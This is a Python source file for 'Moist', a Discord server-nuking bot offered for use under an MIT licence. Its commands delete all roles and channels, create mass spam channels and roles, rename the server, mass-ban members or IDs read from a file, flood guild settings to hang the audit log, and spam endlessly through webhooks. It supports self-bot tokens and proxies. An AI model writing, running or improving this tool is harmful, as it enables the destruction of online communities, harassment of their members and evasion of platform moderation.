import discord
import colorama
import threading
import requests
import json
import os, sys, random, urllib.request, asyncio, time

from discord.ext import commands
from threading import Thread
from requests_futures.sessions import FuturesSession # pip install requests-futures


#Design : Rex Nuker.
if sys.platform == "linux":
  clear = lambda: os.system("clear")
else:
  clear = lambda: os.system("cls")

with open("Moist/settings.json","r") as f:
 settings = json.load(f)
token = settings.get("Token") 
prefix = settings.get("Prefix")
channel_names = settings.get("Channel Names")
role_names = settings.get("Role Names")
server_name = settings.get("Server Name")
webhook_username = settings.get("Webhook Usernames")
reason = settings.get("Reason")
spam = settings.get("Spam")
spam_amount = settings.get("Spam Amount")
spam_messages = settings.get("Spam Messages")
bot = settings.get("bot")



if bot:
 moist = commands.Bot(command_prefix=prefix,intents=discord.Intents.all(),case_insensitive=True,status=discord.Status.invisible)
else:
  moist = commands.Bot(command_prefix=prefix,intents=discord.Intents.all(),self_bot=True,case_insensitive=True,status=discord.Status.invisible)

#Note: You can remove the status for the selfbot. 

moist.remove_command("help")
session = FuturesSession(max_workers=spam_amount)
#Luna Nuker Proxies Cycle.
#token = os.getenv("TOKEN") If you put your token in secrets, delete the `#` & modify the `TOKEN` to the KEY_NAME. If you this bot repl.it. 


color = "\x1b[38;5;92m"#Purple
colour = "\x1b[38;5;89m"#Dark Brown/Red
reset = "\033[0m"

license = """MIT License

Copyright (c) 2022 auth#0009

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""

def menu():
  print(f"""

\033[38;5;160m        auth#0009
\033[38;5;88m███╗   ███╗ ██████╗ ██╗███████╗████████╗
\033[38;5;90m████╗ ████║██╔═══██╗██║██╔════╝╚══██╔══╝
\033[38;5;91m██╔████╔██║██║   ██║██║███████╗   ██║   
\033[38;5;92m██║╚██╔╝██║██║   ██║██║╚════██║   ██║   
\033[38;5;93m██║ ╚═╝ ██║╚██████╔╝██║███████║   ██║   
\033[38;5;93m╚═╝     ╚═╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝   
                                        
\033[38;5;90m═══════════════════════════════════
\033[38;5;90m═══════════════════════════════════════════════

\033[38;5;160mCommands; \033[38;5;89m{prefix}\033[38;5;90mmoisty ~ \033[38;5;91m{prefix}\033[38;5;92mmassban ~ \033[38;5;93m{prefix}\033[38;5;93mhang ~ \033[38;5;93m{prefix}\033[38;5;93mtestban        
\033[38;5;160mClient; \033[38;5;93m{moist.user}
\033[38;5;160mPrefix; \033[38;5;93m{prefix}        
""")

try:
  for line in open("Moist/proxies.txt"):
    proxies.append("\n","")
except:
  pass
if bot:
 headers = {
  "authorization": f"Bot {token}"}
else:
  headers = {
    "authorization": f"{token}"
  }


@moist.command(aliases=["destroy","help","nuke","w","hi"])
async def moisty(ctx):
  await ctx.message.delete()
  guild = ctx.guild.id
  def delete_roles(i): 
    session.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",headers=headers,proxies=urllib.request.getproxies()).result()
    
  def delete_channels(i):
    session.delete(f"https://discord.com/api/v9/channels/{i}",headers=headers,proxies=urllib.request.getproxies()).result()

  def create_channels():
    json = {
      "name": random.choice(channel_names)
    }
    session.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers=headers,json=json,proxies=urllib.request.getproxies()).result()
  def create_roles():
    json = {
      "name": random.choice(role_names),
      "color": random.randint(1000000,9999999)
    }
    session.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers=headers,json=json,proxies=urllib.request.getproxies()).result() 

  for role in ctx.guild.roles:
    threading.Thread(target=delete_roles,args=(role.id,)).start()
    if role == "@everyone":
     pass 
    else:
     print(f"{colour}[{color}+{colour}]{reset} Role {role} was deleted")
  for channel in ctx.guild.channels:
    threading.Thread(target=delete_channels,args=(channel.id,)).start()
    print(f"{colour}[{color}+{colour}]{reset} Channel {channel} was deleted")
  for i in range(100):
    threading.Thread(target=create_channels).start()
    print(f"{colour}[{color}+{colour}]{reset} Channel {random.choice(channel_names)} was created")
  await ctx.guild.edit(name=server_name)  
  for i in range(63):
    threading.Thread(target=create_roles).start()
    print(f"{colour}[{color}+{colour}]{reset} Role {random.choice(role_names)} was created")
    clear()
    menu()


@moist.command(aliases=["banall","ww","zoom","ban","beem","lol","meme"]) 
async def massban(ctx):
  await ctx.message.delete()
  guild = ctx.guild.id 
  proxie = urllib.request.getproxies()
  def mass_ban(member):
    json = {"reason": random.choice(reason)
    }
    
  
    session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",headers=headers,json=json,proxies=proxie).result()
    for member in ctx.guild.members: 
      threading.Thread(target=mass_ban,args=(member.id,)).start()
      print(f"{colour}[{color}+{colour}]{reset} Executed {member}")
      clear()
      menu()

#Note: This command bans 2000 ids in a file. Not guild members, use massban to ban guild members.
@moist.command()
async def testban(ctx):
  await ctx.message.delete()
  guild = ctx.guild.id
  proxie = urllib.request.getproxies()
  
  def mass_testban(member):
    
      session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",headers=headers) 
  memb = open("Moist/ids.txt")
  print(f"{colour}[{color}!{colour}]{reset} Banning IDs..")
  for member in memb:
     threading.Thread(target=mass_testban,args=(member,)).start() 
  memb.close()  

#Credits to Takaso Bypass Audit Log Code, url in Read.md
#This will not be pinging, this is a bypass command.  
@moist.command()
async def hang(ctx):
  await ctx.message.delete()
  guild = ctx.guild.id
  profix = urllib.request.getproxies()

  a = {
    "description": None,
    "features": ["NEWS"],
    "preferred_locale": "en-US",
    "rules_channel_id": None,
    "public_updates_channel_id": None
  }

  a2 = {
    "features": ["COMMUNITY"],
    "preferred_locale": "en-US",
    "rules_channel_id": "1",
    "public_updates_channel_id": "1"
  }
  def CommunityFlood():
    guild = ctx.guild.id
    while True:
        try:
            r = session.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{guild}", headers=headers, json=a2)

        except:
            pass
        try:  
            r = session.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{guild}", headers=headers, json=a)
        except:
            pass
  def Audit_Hang():
    for i in range(8):
        print(f"{colour}[{color}!{colour}]{reset} Hanging Audit Logs..")
        t = threading.Thread(target=CommunityFlood)
        t.start()   
        print(f"{colour}[{color}!{colour}]{reset} Hanged/Crashed Audit Logs.")
  Audit_Hang()    
  #def hang_channels(): 
    #json = {"name": random.choice(hang_names)
    #}
    #r = session.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers=headers,json=json).result()
  #for i in range(100):
    #threading.Thread(target=hang_channels).start()
    #print(f"{colour}[{color}+{colour}]{reset} Channel {random.choice(hang_names)} was created [No action with this command will be logged in audit]")
  #clear()
  #menu()
    

@moist.event
async def on_ready():
  #Credits Rex Nuker
  print(f"""

\033[38;5;160m        auth#0009
\033[38;5;88m███╗   ███╗ ██████╗ ██╗███████╗████████╗
\033[38;5;90m████╗ ████║██╔═══██╗██║██╔════╝╚══██╔══╝
\033[38;5;91m██╔████╔██║██║   ██║██║███████╗   ██║   
\033[38;5;92m██║╚██╔╝██║██║   ██║██║╚════██║   ██║   
\033[38;5;93m██║ ╚═╝ ██║╚██████╔╝██║███████║   ██║   
\033[38;5;93m╚═╝     ╚═╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝   
                                        
\033[38;5;90m═══════════════════════════════════
\033[38;5;90m═══════════════════════════════════════════════

\033[38;5;160mCommands; \033[38;5;89m{prefix}\033[38;5;90mmoisty ~ \033[38;5;91m{prefix}\033[38;5;92mmassban ~ \033[38;5;93m{prefix}\033[38;5;93mhang ~ \033[38;5;93m{prefix}\033[38;5;93mtestban        
\033[38;5;160mClient; \033[38;5;93m{moist.user}
\033[38;5;160mPrefix; \033[38;5;93m{prefix}        
""")

@moist.event
async def on_guild_channel_create(channel):
  if channel.name == "rules":
    pass
  if channel.name == "moderator-only":
    pass
  web = await channel.create_webhook(name=random.choice(webhook_username))
  while True:
    for i in range(50):
      await web.send(random.choice(spam_messages))
if __name__ == "__main__":
   print(f"{colour}[{color}>{colour}]{reset} Loading Client.")
   time.sleep(random.randint(1,4))
   print(f"{colour}[{color}>{colour}]{reset} Loading Modules.")
   time.sleep(random.randint(1,4))
   print(f"{colour}[{color}>{colour}]{reset} All requirements have been installed. Now Displaying the menu.")
   time.sleep(random.randint(1,4)) 
   clear()
   try:
    moist.run(token,bot=bot)
   except Exception as e: 
    clear() 
    print(f"{colour}[{color}!{colour}]{reset} Invalid Token or Bot Token Without all Intents or you're lock from accessing to discord api. ")
